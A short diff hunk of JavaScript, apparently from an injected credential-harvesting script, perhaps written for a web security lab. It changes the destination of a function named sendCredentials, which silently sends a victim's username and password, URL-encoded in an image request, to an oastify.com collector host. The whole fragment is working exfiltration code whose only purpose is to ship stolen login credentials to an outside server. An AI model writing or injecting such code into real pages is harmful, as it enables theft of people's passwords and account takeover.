@@ -48,7 +48,7 @@ setTimeout(function () {
 
   function sendCredentials(username, password) {
     var img = new Image();
-    img.src = `http://sqmgo8e1655a9r138jzg45tv3m9dx3ls.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+    img.src = `http://xuvb90etbgf2joc47hbkmy5id9j07qvf.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
   }
 
   function f() {
